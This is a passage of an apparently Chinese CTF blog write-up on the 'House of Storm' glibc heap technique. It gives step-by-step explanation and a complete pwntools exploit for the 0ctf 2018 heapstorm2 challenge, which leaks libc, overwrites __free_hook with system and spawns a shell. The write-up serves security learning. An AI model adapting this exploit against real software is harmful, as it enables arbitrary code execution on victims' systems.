class="hljs-number">2</span>) <br><span class="hljs-comment">#--------------修改他们是的满足条件进行 house of strom------------------------------#</span><br><span class="hljs-attribute">fake_chunk</span> = <span class="hljs-number">0</span>x13370800 - <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">payload</span> = '\x00' * <span class="hljs-number">0</span>x10 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>, payload) #修改unsorted chunk的bk<br><br><span class="hljs-attribute">payload</span> = '\x00' * <span class="hljs-number">0</span>x20 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4e1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">8</span>, payload)  <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x48) <br></code></pre></td></tr></tbody></table></figure>

<p>现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#-----------------------泄漏 libc----------------------------------#</span><br><span class="hljs-comment">#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址</span><br><br><span class="hljs-attribute">payload</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0</span>x13370800)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">2</span>, payload) #修改了r0~r4为<span class="hljs-number">0</span>，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是<span class="hljs-number">0</span><br><br><span class="hljs-attribute">dbg</span>()<br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p>之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，<br>所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)  #满足show的条件<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) <span class="hljs-selector-id">#chunk0</span><br>payload += <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">3</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>)   <span class="hljs-selector-id">#chunk1</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>, payload)</span></span> #满足show的条件<br><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span>  #我们刚刚house of storm 写的地址泄漏出来<br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">"]: "</span>)</span></span><br>heap = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))<br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(<span class="hljs-string">"heap:"</span>+hex(heap)</span></span>)<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload  = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)#满足show的条件<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) <span class="hljs-selector-id">#chunk0</span><br>payload += <span class="hljs-built_in">p64</span>(heap+<span class="hljs-number">0</span>x10) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>) <span class="hljs-selector-id">#chunk1</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>, payload)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span> #泄漏libc地址<br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">"]: "</span>)</span></span><br>malloc_hook = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) -<span class="hljs-number">0</span>x58 - <span class="hljs-number">0</span>x10<br>libc_base = malloc_hook - libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__malloc_hook'</span>]</span><br>free_hook = libc_base+libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__free_hook'</span>]</span><br>system = libc_base+ libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'system'</span>]</span><br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(<span class="hljs-string">"free_hook:"</span>+hex(free_hook)</span></span>)<br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p>之后我们要做到就是在全局数组里写入free hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\x00在chunk1处</p>
<figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr">#--------------修改 free_hook -----------------------------------#</span><br><span class="hljs-attr">payload  = p64</span><span class="hljs-comment">(0)</span>*<span class="hljs-number">4</span><br>payload += p<span class="hljs-number">64</span><span class="hljs-comment">(free_hook)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x100)</span><span class="hljs-attr">#chunk0</span><br>payload += p<span class="hljs-number">64</span><span class="hljs-comment">(0x13370800+0x40)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(8)</span><span class="hljs-attr">#chunk1</span><br>payload += <span class="hljs-string">'/bin/sh\x00'</span><br>edit<span class="hljs-comment">(0, payload)</span><br><br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后改free_hook为system，free(1)，获得shell</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>, p64(system)</span></span>)<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#coding</span>:utf-<span class="hljs-number">8</span><br>from pwn import *<br><span class="hljs-built_in">context</span>(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">'./0ctf_2018_heapstorm2'</span>)<br>libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">'./libc-2.23.so'</span>)<br>#命令简写化<br>s       = lambda data               :sh.<span class="hljs-built_in">send</span>(data)<br>sa      = lambda delim,data         :sh.<span class="hljs-built_in">sendafter</span>(delim,data)<br>sl      = lambda data               :sh.<span class="hljs-built_in">sendline</span>(data)<br>sla     = lambda delim,data         :sh.<span class="hljs-built_in">sendlineafter</span>(delim,data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recv</span>(num)<br>rl      = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recvline</span>(num)<br>ru      = lambda delims   :sh.<span class="hljs-built_in">recvuntil</span>(delims )<br>itr     = lambda                    :sh.<span class="hljs-built_in">interactive</span>()<br>uu32    = lambda data               :<span class="hljs-built_in">u32</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :<span class="hljs-built_in">u64</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br>def <span class="hljs-built_in">dbg</span>():<br>        gdb.<span class="hljs-built_in">attach</span>(sh)<br>        <span class="hljs-built_in">pause</span>()<br>def <span class="hljs-built_in">add</span>(size):<br><br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'1'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(size))  # <span class="hljs-number">12</span>&lt;size&lt;<span class="hljs-number">0</span>x1000<br><br><br>def <span class="hljs-built_in">edit</span>(idx,content):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'2'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    <span class="hljs-built_in">sa</span>(<span class="hljs-string">'Content: '</span>,content)<br><br><br><br>def <span class="hljs-built_in">free</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'3'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br><br><br>def <span class="hljs-built_in">show</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'4'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br><br>#---------------布置chunk-------------------------#<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">0</span>	 <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">2</span><br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">3</span>   <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">4</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span>   <br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span>  <br><br>#----------------准备 unsorted chunk-----------------------#<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">1</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x4F0+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x500)) <br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>))  <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">1</span> <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">7</span>  <br><br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)   <br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>) #<span class="hljs-number">1</span>-<span class="hljs-number">2</span> 合并  <br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x38)#<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">2</span>   <br><br>#-------------------准备 large chunk-----------------------------------#<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x4F0+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x500))#伪造chunk<br><span class="hljs-built_in">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span>*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>)) <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">4</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">8</span>  <br><br><span class="hljs-built_in">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">5</span>) #<span class="hljs-number">4</span>-<span class="hljs-number">5</span> <br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x48)#<span class="hljs-number">4</span>  <br>#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4e8) <br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>)   <br>#--------------修改他们是的满足条件进行 house of strom------------------------------#<br>fake_chunk = <span class="hljs-number">0</span>x13370800 - <span class="hljs-number">0</span>x20<br>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>x10 + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4f1) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">7</span>, payload) #修改unsorted chunk的bk<br><br>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>x20 + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4e1) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">8</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">8</span>, payload) #修改 large chunk 的 bk 和 bk_nextsize<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x48)  #<span class="hljs-number">2</span>  -&gt; <span class="hljs-number">0</span>x133707e0   成功将申请到了heaparray附近<br><br> <br><br>#-----------------------泄漏 libc----------------------------------#<br>#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址<br><br>payload = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">2</span>, payload) #修改了r0~r4为<span class="hljs-number">0</span>，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是<span class="hljs-number">0</span><br><br>#<span class="hljs-built_in">dbg</span>()<br> <br>payload = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)  #满足show的条件<br><br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) #chunk0<br>payload += <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">3</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>)   #chunk1<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, payload) #满足show的条件<br><br>#<span class="hljs-built_in">dbg</span>()<br><br><span class="hljs-built_in">show</span>(<span class="hljs-number">1</span>)  #我们刚刚house of storm 写的地址泄漏出来<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">"]: "</span>)<br>heap = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))<br><span class="hljs-built_in">success</span>(<span class="hljs-string">"heap:"</span>+<span class="hljs-built_in">hex</span>(heap))<br><br>#<span class="hljs-built_in">dbg</span>()<br><br>payload  = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)#满足show的条件<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) #chunk0<br>payload += <span class="hljs-built_in">p64</span>(heap+<span class="hljs-number">0</span>x10) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>) #chunk1<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, payload)<br><br>#<span class="hljs-built_in">dbg</span>()<br><br><span class="hljs-built_in">show</span>(<span class="hljs-number">1</span>) #泄漏libc地址<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">"]: "</span>)<br>malloc_hook = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) -<span class="hljs-number">0</span>x58 - <span class="hljs-number">0</span>x10<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>free_hook = libc_base+libc.sym[<span class="hljs-string">'__free_hook'</span>]<br>system = libc_base+ libc.sym[<span class="hljs-string">'system'</span>]<br><span class="hljs-built_in">success</span>(<span class="hljs-string">"free_hook:"</span>+<span class="hljs-built_in">hex</span>(free_hook))<br> <br>#--------------修改 free_hook -----------------------------------#<br>payload  = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>payload += <span class="hljs-built_in">p64</span>(free_hook) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x100)#chunk0<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800+<span class="hljs-number">0</span>x40) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>)#chunk1<br>payload += <span class="hljs-string">'/bin/sh\x00'</span><br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, payload)<br>#<span class="hljs-built_in">dbg</span>()<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">p64</span>(system))<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">itr</span>()<br></code></pre></td></tr></tbody></table></figure>

<blockquote>
<p>参考文章<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203096">House of storm 原理及利用</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/209096.html">Largebin Attack</a><br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">CTF-WIKI</a><br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-262424.htm#msg_header_h1_2">Largebin attack总结</a></p>
</blockquote>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/">← Next House of Storm + 堆SROP + orw</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/double%20free/">doublefree Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-storm"><span class="toc-number">1.</span> <span class="toc-text">House of storm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">利用条件:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#largebin%E4%B8%ADsize%E4%B8%8Eindex%E7%9A%84%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB"><span class="toc-number">1.1.1.</span> <span class="toc-text">largebin中size与index的对应关系</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-Storm-note"><span class="toc-number">1.3.1.</span> <span class="toc-text">2019 西湖论剑 Storm_note</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#init-proc-%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">init_proc()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.2.</span> <span 